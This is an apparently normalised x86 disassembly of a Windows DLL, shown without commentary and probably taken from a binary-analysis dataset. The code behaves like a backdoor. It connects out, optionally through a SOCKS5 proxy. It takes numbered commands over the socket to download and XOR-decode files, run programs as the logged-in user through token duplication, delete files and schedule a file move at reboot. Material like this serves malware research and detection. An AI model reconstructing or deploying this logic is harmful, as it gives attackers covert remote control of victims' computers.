sub_10001000
push ebp
mov ebp esp
sub esp 0x294
mov eax [ ebp + 0xc ]
push ebx
xor ebx ebx
sub eax ebx
je r-xdata
call [ WSACleanup@IAT ]
dec eax
jne r-xdata
push 0x1
pop eax
pop ebx
leave
retn 0xc
lea eax [ ebp - 0x294 ]
push edi
push eax
push 0x202
call [ WSAStartup@IAT ]
push ebx
push ebx
push [ ebp + 0x8 ]
push sub_1000292d
push ebx
push ebx
call [ CreateThread@IAT ]
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x103 ]
mov [ ebp - 0x104 ] bl
push 0x104
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x104 ]
push eax
push [ ebp + 0x8 ]
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x104 ]
push eax
call [ LoadLibraryA@IAT ]
pop edi
jmp r-xdata
sub_10001084
push ebp
mov ebp esp
mov eax 0x2910
call sub_10002ec0
push ebx
push esi
push edi
push [ ebp + 0xc ]
push rw-data
call sub_10001609
xor esi esi
lea eax [ ebp - 0x4 ]
push esi
push 0x4
push eax
mov [ ebp - 0x8 ] esi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
call sub_1000179c
add esp 0x18
cmp eax 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp - 0x4 ]
push rw-data
call sub_10001609
cmp [ ebp - 0x4 ] esi
pop ecx
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x110 ] 0x0
push 0x40
pop ecx
xor eax eax
lea edi [ ebp - 0x10f ]
push 0x104
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call memcpy
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call strcat
push [ ebp + 0xc ]
lea eax [ ebp - 0x110 ]
push eax
call strcat
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call [ fopen@IAT ]
add esp 0x24
cmp eax esi
mov [ ebp - 0xc ] eax
je r-xdata
cmp [ ebp - 0x4 ] esi
mov ebx [ fwrite@IAT ]
jbe r-xdata
mov esi 0x186a000
push esi
call ??2@YAPAXI@Z
mov edi eax
pop ecx
xor eax eax
mov edi 0x2800
mov cl al
add cl 0x7f
xor [ eax + edi ] cl
inc eax
cmp eax esi
jl r-xdata
push [ ebp - 0xc ]
push 0x1
push esi
push edi
call ebx
push edi
call ??3@YAXPAX@Z
push [ ebp - 0xc ]
call [ fclose@IAT ]
add esp 0x18
push [ ebp + 0x8 ]
call [ closesocket@IAT ]
push [ ebp + 0xc ]
push rw-data
call sub_10001609
pop ecx
pop ecx
push 0x1
pop eax
push esi
push eax
lea eax [ ebp - 0x2910 ]
push eax
push [ ebp + 0x8 ]
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax edi
push [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x2910 ]
push 0x1
push eax
call ebx
add esp 0x10
cmp eax esi
je r-xdata
add [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jb r-xdata
push edi
lea eax [ ebp - 0x2910 ]
push esi
push eax
call memset
mov eax [ ebp - 0x4 ]
add esp 0xc
sub eax [ ebp - 0x8 ]
cmp eax edi
jbe r-xdata
sub_1000120a
push ebp
mov ebp esp
mov eax 0x29a0
call sub_10002ec0
push ebx
push esi
xor ebx ebx
push edi
push ebx
lea eax [ ebp - 0x4 ]
push 0x4
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1000179c
add esp 0x10
cmp eax 0xffffffff
je r-xdata
push 0x1
pop eax
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x10b ]
mov [ ebp - 0x10c ] bl
push 0x105
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x10c ]
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call [ fopen@IAT ]
mov edi eax
add esp 0x18
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push edi
call [ fclose@IAT ]
pop ecx
xor eax eax
push 0x24
lea edi [ ebp - 0x19c ]
pop ecx
[ edi ]
lea eax [ ebp - 0x1a0 ]
mov [ ebp - 0x1a0 ] 0x94
push eax
call [ rw-data ]
cmp [ ebp - 0x19c ] 0x5
lea eax [ ebp - 0x10c ]
push ebx
push eax
jbe r-xdata
mov esi 0x2800
pop edi
pop esi
pop ebx
leave
retn
call [ WinExec@IAT ]
call sub_1000160a
pop ecx
pop ecx
jmp r-xdata
push ebx
push eax
lea eax [ ebp - 0x29a0 ]
push eax
push [ ebp + 0x8 ]
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax esi
push 0x1388
call [ Sleep@IAT ]
push edi
push eax
lea eax [ ebp - 0x29a0 ]
push 0x1
push eax
call [ fwrite@IAT ]
add esp 0x10
cmp eax ebx
je r-xdata
add [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jb r-xdata
push esi
lea eax [ ebp - 0x29a0 ]
push ebx
push eax
call memset
mov eax [ ebp - 0x4 ]
add esp 0xc
sub eax [ ebp - 0x8 ]
cmp eax esi
jbe r-xdata
sub_1000136e
push esi
xor esi esi
push esi
push rw-data
call sub_1000145f
push rw-data
call sub_100013f5
push rw-data
call sub_100013f5
push rw-data
call sub_100013f5
push rw-data
call sub_100013f5
push rw-data
call sub_100013f5
push rw-data
call sub_100013f5
push rw-data
call sub_100013f5
mov eax [ rw-data ]
add esp 0x24
sub eax esi
je r-xdata
push esi
push rw-data
dec eax
je r-xdata
push esi
push rw-data
jmp r-xdata
dec eax
jne r-xdata
call [ WinExec@IAT ]
push 0x1
pop eax
pop esi
retn
push esi
push rw-data
jmp r-xdata
sub_100013f5
push ebp
mov ebp esp
sub esp 0x104
and [ ebp - 0x104 ] 0x0
push edi
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x103 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x104
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call memcpy
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call strcat
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call strcat
add esp 0x1c
lea eax [ ebp - 0x104 ]
push eax
call [ DeleteFileA@IAT ]
pop edi
leave
retn
sub_1000145f
push ebp
mov ebp esp
sub esp 0x30c
push ebx
push esi
push edi
push 0x40
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x103 ]
mov [ ebp - 0x104 ] bl
mov esi 0x104
[ edi ]
stosw [ edi ]
stosb [ edi ]
push esi
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call memcpy
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call strcat
add esp 0x14
cmp [ ebp + 0xc ] ebx
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call strcat
pop ecx
xor eax eax
pop ecx
lea edi [ ebp - 0x207 ]
push 0x40
mov [ ebp - 0x208 ] bl
pop ecx
mov [ ebp - 0x30c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x30b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
call [ GetTickCount@IAT ]
push eax
call [ srand@IAT ]
pop ecx
lea eax [ ebp - 0x208 ]
push esi
push eax
call [ GetWindowsDirectoryA@IAT ]
call [ rand@IAT ]
push eax
lea eax [ ebp - 0x30c ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x30c ]
push eax
lea eax [ ebp - 0x208 ]
push eax
call strcat
mov esi [ MoveFileExA@IAT ]
add esp 0x14
lea eax [ ebp - 0x208 ]
push 0x1
push eax
lea eax [ ebp - 0x104 ]
push eax
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call strcat
pop ecx
pop ecx
push 0x4
lea eax [ ebp - 0x208 ]
push ebx
push eax
call esi
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
push eax
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
push rw-data
call sub_10001609
add esp 0x10
sub_1000159d
push ebp
mov ebp esp
sub esp 0x104
and [ ebp - 0x104 ] 0x0
push edi
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x103 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x104
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call memcpy
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call strcat
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call strcat
lea eax [ ebp - 0x104 ]
push 0x0
push eax
call [ _access@IAT ]
add esp 0x24
pop edi
leave
retn
sub_1000160a
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
push 0x10
pop ecx
xor eax eax
lea edi [ ebp - 0x5c ]
xor esi esi
[ edi ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x1c ] esi
stosd [ edi ]
stosd [ edi ]
push rw-data
push rw-data
stosd [ edi ]
mov [ ebp - 0x60 ] 0x44
call [ GetModuleHandleA@IAT ]
mov edi [ GetProcAddress@IAT ]
push eax
call edi
cmp eax esi
je r-xdata
xor eax eax
jmp r-xdata
call eax
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] esi
push ecx
push eax
call WTSQueryUserToken
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push eax
push 0x1
push 0x1
push esi
push 0x2000000
push [ ebp - 0x8 ]
call [ DuplicateTokenEx@IAT ]
test eax eax
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call edi
cmp eax esi
je r-xdata
push esi
lea ecx [ ebp - 0xc ]
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] esi
push ecx
call eax
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
mov ebx 0x430
push eax
lea eax [ ebp - 0x60 ]
push eax
push esi
push [ ebp - 0xc ]
mov edi [ CreateProcessAsUserA@IAT ]
push ebx
push esi
push esi
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
push [ ebp - 0x1c ]
mov edi [ CloseHandle@IAT ]
call edi
push [ ebp - 0x18 ]
call edi
cmp [ ebp - 0x8 ] esi
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x60 ]
push eax
push esi
push [ ebp - 0xc ]
push ebx
push esi
push esi
push esi
push esi
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push [ ebp - 0x8 ]
call edi
push 0x1
pop eax
push [ ebp - 0x4 ]
call edi
sub_1000173b
push esi
push edi
mov edi [ esp + 0x14 ]
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
push esi
call [ EnterCriticalSection@IAT ]
call [ GetTickCount@IAT ]
push esi
mov [ rw-data ] eax
call [ LeaveCriticalSection@IAT ]
mov eax edi
push [ esp + 0x18 ]
mov eax edi
sub eax esi
push eax
mov eax [ esp + 0x18 ]
add eax esi
push eax
push [ esp + 0x18 ]
call [ send@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
retn
or eax 0xffffffff
jmp r-xdata
add esi eax
cmp esi edi
jl r-xdata
sub_1000179c
push esi
push edi
mov edi [ esp + 0x14 ]
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
push esi
call [ EnterCriticalSection@IAT ]
and [ rw-data ] 0x0
call [ GetTickCount@IAT ]
push esi
mov [ rw-data ] eax
call [ LeaveCriticalSection@IAT ]
mov eax edi
push [ esp + 0x18 ]
mov eax edi
sub eax esi
push eax
mov eax [ esp + 0x18 ]
add eax esi
push eax
push [ esp + 0x18 ]
call [ recv@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
retn
or eax 0xffffffff
jmp r-xdata
add esi eax
cmp esi edi
jl r-xdata
sub_10001804
push ebp
mov ebp esp
sub esp 0x10c
mov eax [ ebp + 0xc ]
xor ecx ecx
and [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
push esi
mov esi [ ebp + 0x8 ]
push ecx
push 0x0
lea eax [ ebp - 0x10c ]
push 0x0
push eax
lea eax [ esi + 0x1 ]
push eax
mov [ ebp - 0x108 ] esi
mov [ ebp - 0x10c ] 0x1
call [ select@IAT ]
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x8 ]
test eax eax
je r-xdata
mov [ ecx ] eax
xor al al
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x10c ]
push eax
push esi
call __WSAFDIsSet
test eax eax
setne al
sub_10001874
push ebp
mov ebp esp
sub esp 0x81c
mov eax [ ebp + 0x14 ]
xor ecx ecx
push ebx
push esi
sub eax ecx
push edi
mov [ ebp - 0x4 ] ecx
mov ebx 0xffff
je r-xdata
push ecx
push 0x1
push 0x2
call [ socket@IAT ]
mov esi [ ebp + 0x8 ]
cmp eax 0xffffffff
mov [ esi ] eax
je r-xdata
push ecx
dec eax
push 0x1
push 0x2
je r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov edi [ setsockopt@IAT ]
lea ecx [ ebp + 0x14 ]
push 0x4
push ecx
push 0x1006
push ebx
push eax
mov [ ebp + 0x14 ] 0x7530
call edi
lea eax [ ebp + 0x14 ]
push 0x4
push eax
push 0x1005
push ebx
push [ esi ]
call edi
push [ ebp + 0x1c ]
call [ htons@IAT ]
push [ ebp + 0x18 ]
mov [ ebp - 0x12 ] ax
mov [ ebp - 0x14 ] 0x2
call sub_10001724
pop ecx
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x14 ]
push 0x10
push eax
push [ esi ]
call [ connect@IAT ]
cmp eax 0xffffffff
je r-xdata
call [ socket@IAT ]
mov esi [ ebp + 0x8 ]
cmp eax 0xffffffff
mov [ esi ] eax
je r-xdata
call [ socket@IAT ]
mov esi [ ebp + 0x8 ]
cmp eax 0xffffffff
mov [ esi ] eax
je r-xdata
xor eax eax
push 0x0
push 0x1
push 0x2
call [ socket@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
je r-xdata
and [ ebp - 0x41c ] 0x0
mov edx 0xff
mov ecx edx
xor eax eax
lea edi [ ebp - 0x41b ]
and [ ebp - 0x81c ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx edx
xor eax eax
lea edi [ ebp - 0x81b ]
push [ ebp + 0x10 ]
[ edi ]
push [ ebp + 0xc ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x81c ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x10
lea eax [ ebp - 0x81c ]
push 0x0
push eax
call strlen
pop ecx
push eax
lea eax [ ebp - 0x81c ]
push eax
push [ esi ]
call [ send@IAT ]
cmp eax 0xffffffff
je r-xdata
mov edi [ setsockopt@IAT ]
lea ecx [ ebp + 0x14 ]
push 0x4
push ecx
push 0x1006
push ebx
push eax
mov [ ebp + 0x14 ] 0x7530
call edi
lea eax [ ebp + 0x14 ]
push 0x4
push eax
push 0x1005
push ebx
push [ esi ]
call edi
push [ ebp + 0x1c ]
call [ htons@IAT ]
push [ ebp + 0x18 ]
mov [ ebp - 0x12 ] ax
mov [ ebp - 0x14 ] 0x2
call sub_10001724
pop ecx
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x14 ]
push 0x10
push eax
push [ esi ]
call [ connect@IAT ]
cmp eax 0xffffffff
je r-xdata
mov edi [ setsockopt@IAT ]
lea ecx [ ebp + 0x1c ]
push 0x4
push ecx
push 0x1006
push ebx
push eax
mov [ ebp + 0x1c ] 0x7530
call edi
lea eax [ ebp + 0x1c ]
push 0x4
push eax
push 0x1005
push ebx
push [ esi ]
call edi
push [ ebp + 0x10 ]
call [ htons@IAT ]
push [ ebp + 0xc ]
mov [ ebp - 0x12 ] ax
mov [ ebp - 0x14 ] 0x2
call sub_10001724
pop ecx
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x14 ]
push 0x10
push eax
push [ esi ]
call [ connect@IAT ]
xor ecx ecx
cmp eax 0xffffffff
setne cl
mov eax ecx
jmp r-xdata
push [ ebp + 0x10 ]
call [ htons@IAT ]
push [ ebp + 0xc ]
mov [ ebp - 0x12 ] ax
mov [ ebp - 0x14 ] 0x2
call sub_10001724
pop ecx
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x14 ]
push 0x10
push eax
push [ esi ]
call [ connect@IAT ]
cmp eax 0xffffffff
je r-xdata
push 0x0
lea eax [ ebp - 0x41c ]
push 0x400
push eax
push [ esi ]
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ecx 0xff
xor eax eax
lea edi [ ebp - 0x41b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov [ ebp - 0x41c ] 0x5
and [ ebp - 0x41a ] al
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
push eax
lea eax [ ebp - 0x41c ]
push 0x12c
push eax
mov [ ebp - 0x41b ] 0x1
push [ esi ]
call [ send@IAT ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edi [ setsockopt@IAT ]
lea eax [ ebp - 0x4 ]
push 0x4
push eax
push 0x1006
push ebx
push [ esi ]
call edi
lea eax [ ebp - 0x4 ]
push 0x4
push eax
push 0x1005
push ebx
push [ esi ]
call edi
push 0x1
pop eax
jmp r-xdata
cmp [ ebp - 0x413 ] 0x32
jne r-xdata
mov edi 0x400
lea eax [ ebp - 0x41c ]
push edi
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x41c ]
push 0x0
push 0x2
push eax
push [ esi ]
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x412 ] 0x30
jne r-xdata
cmp [ ebp - 0x41c ] 0x5
jne r-xdata
cmp [ ebp - 0x411 ] 0x30
je r-xdata
cmp [ ebp - 0x41b ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x41c ]
push 0x0
push eax
call memset
push [ ebp + 0xc ]
and [ ebp - 0x41a ] 0x0
mov [ ebp - 0x41c ] 0x5
mov [ ebp - 0x41b ] 0x1
mov [ ebp - 0x419 ] 0x1
call sub_10001724
add esp 0x10
mov [ ebp - 0x1c ] eax
push [ ebp + 0x10 ]
call [ htons@IAT ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push 0x4
push eax
lea eax [ ebp - 0x418 ]
push eax
call memcpy
lea eax [ ebp - 0x18 ]
push 0x2
push eax
lea eax [ ebp - 0x414 ]
push eax
call memcpy
add esp 0x18
lea eax [ ebp - 0x41c ]
push 0x0
push 0xa
push eax
push [ esi ]
call [ send@IAT ]
cmp eax 0xffffffff
je r-xdata
push edi
lea eax [ ebp - 0x41c ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x41c ]
push 0x0
push 0xa
push eax
push [ esi ]
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x41b ] 0x0
jne r-xdata
cmp [ ebp - 0x419 ] 0x0
jne r-xdata
jmp r-xdata
sub_10001cdb
push esi
mov esi ecx
push edi
mov edi [ CloseHandle@IAT ]
push [ esi + 0x8 ]
mov [ esi ] r--data
call edi
push [ esi + 0xc ]
call edi
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
or [ esi + 0x4 ] 0xffffffff
push rw-data
call [ DeleteCriticalSection@IAT ]
pop edi
pop esi
retn
push eax
call [ closesocket@IAT ]
sub_10001d16
sub esp 0x16c
push ebx
push ebp
push esi
mov esi [ esp + 0x17c ]
push edi
push esi
push rw-data
call sub_10001609
mov ebx [ CreateThread@IAT ]
pop ecx
mov [ esp + 0x14 ] esi
pop ecx
xor esi esi
mov ebp sub_10002610
push 0x1f4
call [ Sleep@IAT ]
jmp r-xdata
push esi
lea eax [ esp + 0x1c ]
push 0x4
push eax
push edi
mov [ esp + 0x28 ] esi
call sub_1000179c
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov edi [ esp + 0x10 ]
push esi
push 0x1
push edi
call sub_10001804
add esp 0xc
test al al
je r-xdata
call [ WSAGetLastError@IAT ]
push eax
push rw-data
jmp r-xdata
cmp eax esi
je r-xdata
call sub_10001609
pop ecx
pop ecx
push 0x2
push edi
call [ shutdown@IAT ]
push edi
call [ closesocket@IAT ]
push rw-data
call sub_10001609
pop ecx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x16c
retn 0x4
call [ WSAGetLastError@IAT ]
push eax
push rw-data
mov eax [ esp + 0x18 ]
mov ecx 0x1b62
cmp eax ecx
jg r-xdata
mov ecx 0x1f45
cmp eax ecx
jg r-xdata
je r-xdata
sub eax 0x1f46
je r-xdata
je r-xdata
call sub_1000136e
jmp r-xdata
mov ecx 0x1393
cmp eax ecx
jg r-xdata
push rw-data
dec eax
je r-xdata
push rw-data
jmp r-xdata
sub eax 0x1b63
je r-xdata
sub eax 0x1394
je r-xdata
je r-xdata
push rw-data
jmp r-xdata
dec eax
je r-xdata
call sub_100013f5
mov edi 0x2800
push edi
call ??2@YAPAXI@Z
push edi
push esi
push eax
mov [ esp + 0x24 ] eax
call memset
add esp 0x10
push esi
push edi
push [ esp + 0x1c ]
push [ esp + 0x1c ]
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
sub eax 0x3de
je r-xdata
push 0x108
call ??2@YAPAXI@Z
mov edi eax
mov [ esp ] rw-data
mov [ edi + 0x104 ] 0x1b64
sub eax 0x7ca
je r-xdata
push 0x108
call ??2@YAPAXI@Z
mov edi eax
mov [ esp ] rw-data
mov [ edi + 0x104 ] 0x1b5d
jmp r-xdata
sub eax 0x138e
je r-xdata
push 0x6
xor eax eax
pop ecx
lea edi [ esp + 0x20 ]
mov [ esp + 0x1c ] esi
push rw-data
[ edi ]
call sub_1000159d
mov [ esp + 0x20 ] eax
mov [ esp ] rw-data
call sub_1000159d
mov [ esp + 0x24 ] eax
mov [ esp ] rw-data
call sub_1000159d
mov [ esp + 0x28 ] eax
mov [ esp ] rw-data
call sub_1000159d
mov [ esp + 0x2c ] eax
mov [ esp ] rw-data
call sub_1000159d
mov [ esp + 0x30 ] eax
mov [ esp ] rw-data
call sub_1000159d
mov [ esp + 0x34 ] eax
mov [ esp ] rw-data
call sub_1000159d
mov [ esp + 0x38 ] eax
push esi
lea eax [ esp + 0x24 ]
push 0x1c
push eax
push [ esp + 0x20 ]
call sub_1000173b
add esp 0x14
jmp r-xdata
dec eax
dec eax
je r-xdata
push esi
push esi
push [ esp + 0x1c ]
push sub_10002e76
push esi
push esi
call ebx
jmp r-xdata
push rw-data
jmp r-xdata
dec eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
jmp r-xdata
cmp edi esi
je r-xdata
push rw-data
push 0x2
jmp r-xdata
dec eax
je r-xdata
push edi
call strcpy
pop ecx
pop ecx
push esi
push esi
push edi
push ebp
push esi
push esi
call ebx
cmp eax esi
jne r-xdata
push 0x108
call ??2@YAPAXI@Z
mov edi eax
mov [ esp ] rw-data
mov [ edi + 0x104 ] 0x1b58
jmp r-xdata
dec eax
je r-xdata
push rw-data
call sub_100013f5
mov [ esp ] rw-data
call sub_100013f5
mov [ esp ] rw-data
call sub_100013f5
mov [ esp ] rw-data
call sub_100013f5
mov [ esp ] rw-data
call sub_100013f5
mov [ esp ] rw-data
call sub_100013f5
mov [ esp ] rw-data
call sub_100013f5
mov [ esp ] rw-data
call sub_100013f5
mov [ esp ] rw-data
call sub_100013f5
push 0x1
push rw-data
call sub_1000145f
add esp 0xc
jmp r-xdata
dec eax
jne r-xdata
push rw-data
jmp r-xdata
dec eax
je r-xdata
push edi
call ??3@YAXPAX@Z
pop ecx
jmp r-xdata
call sub_10002d3a
jmp r-xdata
push rw-data
push 0x1
jmp r-xdata
dec eax
je r-xdata
push 0x108
call ??2@YAPAXI@Z
mov edi eax
mov [ esp ] rw-data
mov [ edi + 0x104 ] 0x1b59
jmp r-xdata
dec eax
je r-xdata
push 0x50
xor eax eax
pop ecx
lea edi [ esp + 0x3c ]
mov [ esp + 0x38 ] esi
push esi
[ edi ]
lea eax [ esp + 0x3c ]
push 0x144
push eax
push [ esp + 0x1c ]
call sub_1000179c
add esp 0x10
cmp eax 0xffffffff
je r-xdata
push rw-data
jmp r-xdata
dec eax
jne r-xdata
pop ecx
jmp r-xdata
push rw-data
push esi
dec eax
jne r-xdata
push 0x108
call ??2@YAPAXI@Z
mov edi eax
mov [ esp ] rw-data
mov [ edi + 0x104 ] 0x1b5a
jmp r-xdata
dec eax
je r-xdata
mov eax [ esp + 0x38 ]
cmp eax 0x2
mov [ rw-data ] eax
je r-xdata
push rw-data
jmp r-xdata
pop ecx
push edi
call sub_1000120a
jmp r-xdata
push 0x108
call ??2@YAPAXI@Z
mov edi eax
mov [ esp ] rw-data
mov [ edi + 0x104 ] 0x1b5b
jmp r-xdata
dec eax
jne r-xdata
push 0x2
push [ esp + 0x14 ]
call [ shutdown@IAT ]
push [ esp + 0x10 ]
call [ closesocket@IAT ]
push rw-data
or [ esp + 0x14 ] 0xffffffff
call sub_10001609
pop ecx
push [ esp + 0x38 ]
push rw-data
call sub_10001609
pop ecx
lea eax [ esp + 0x40 ]
pop ecx
push eax
push rw-data
call sub_10001609
pop ecx
pop ecx
push [ esp + 0x140 ]
push rw-data
call sub_10001609
pop ecx
pop ecx
push [ esp + 0x178 ]
push rw-data
call sub_10001609
lea eax [ esp + 0x3c ]
push 0x104
push eax
push rw-data
call memcpy
mov eax [ esp + 0x14c ]
add esp 0xc
mov [ rw-data ] eax
mov eax [ esp + 0x178 ]
mov [ rw-data ] eax
push 0x108
call ??2@YAPAXI@Z
mov edi eax
mov [ esp ] rw-data
mov [ edi + 0x104 ] 0x1b5c
jmp r-xdata
sub_1000225e
sub esp 0x394
push ebx
push ebp
push esi
push edi
mov edi ecx
push rw-data
mov [ esp + 0x18 ] edi
call sub_10001609
mov ebp [ CreateThread@IAT ]
xor ebx ebx
pop ecx
mov [ esp + 0x10 ] ebx
lea esi [ edi + 0x4 ]
push rw-data
call sub_10001609
pop ecx
mov [ esp + 0x10 ] ebx
call [ GetTickCount@IAT ]
push ebx
push ebx
mov [ rw-data ] eax
push [ esi ]
push r-xdata
push ebx
push ebx
call ebp
push rw-data
mov [ edi + 0xc ] eax
call sub_10001609
push ebx
lea eax [ esp + 0x20 ]
push 0x4
push eax
push [ esi ]
mov [ esp + 0x2c ] 0x1770
call sub_1000173b
add esp 0x14
xor eax eax
lea edi [ esp + 0x20 ]
mov [ esp + 0x1c ] ebx
push 0x70
pop ecx
[ edi ]
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
call sub_100025a1
push ebx
lea eax [ esp + 0x20 ]
push 0x1c4
push eax
push [ esi ]
call sub_1000173b
add esp 0x10
push ebx
push ebx
push [ esi ]
push sub_10001d16
push ebx
push ebx
call ebp
push rw-data
mov [ rw-data ] eax
call sub_10001609
pop ecx
push 0xffffffff
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push rw-data
call sub_10001609
mov edi [ esp + 0x18 ]
pop ecx
jmp r-xdata
push [ rw-data ]
push rw-data
call [ WSAGetLastError@IAT ]
push eax
push rw-data
call sub_10001609
add esp 0x10
push [ esi ]
call [ closesocket@IAT ]
cmp [ rw-data ] ebx
je r-xdata
push [ rw-data ]
push [ rw-data ]
push rw-data
push [ rw-data ]
push [ rw-data ]
push rw-data
push esi
call sub_10001874
add esp 0x1c
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
jne r-xdata
inc [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
imul eax eax 0xea60
push eax
push 0xfa0
jmp r-xdata
push 0x40
xor eax eax
pop ecx
lea edi [ esp + 0x1d ]
mov [ esp + 0x1c ] bl
[ edi ]
stosw [ edi ]
mov ecx [ esp + 0x14 ]
stosb [ edi ]
lea eax [ esp + 0x1c ]
push eax
push rw-data
call sub_10002804
test eax eax
je r-xdata
call [ Sleep@IAT ]
jmp r-xdata
push rw-data
jmp r-xdata
lea eax [ esp + 0x1c ]
push rw-data
push eax
call [ strstr@IAT ]
pop ecx
cmp eax ebx
pop ecx
mov [ esp + 0x18 ] eax
je r-xdata
call sub_10001609
pop ecx
jmp r-xdata
lea eax [ esp + 0x1c ]
push rw-data
push eax
call [ strcspn@IAT ]
push eax
lea eax [ esp + 0x28 ]
mov edi rw-data
push eax
push edi
call memcpy
mov eax [ esp + 0x2c ]
inc eax
push eax
call [ atoi@IAT ]
add esp 0x18
mov [ rw-data ] eax
push eax
push edi
push rw-data
call sub_10001609
push [ rw-data ]
push [ rw-data ]
push rw-data
push [ rw-data ]
push [ rw-data ]
push edi
push esi
call sub_10001874
add esp 0x28
test eax eax
jne r-xdata
push rw-data
call sub_10001609
pop ecx
call [ GetTickCount@IAT ]
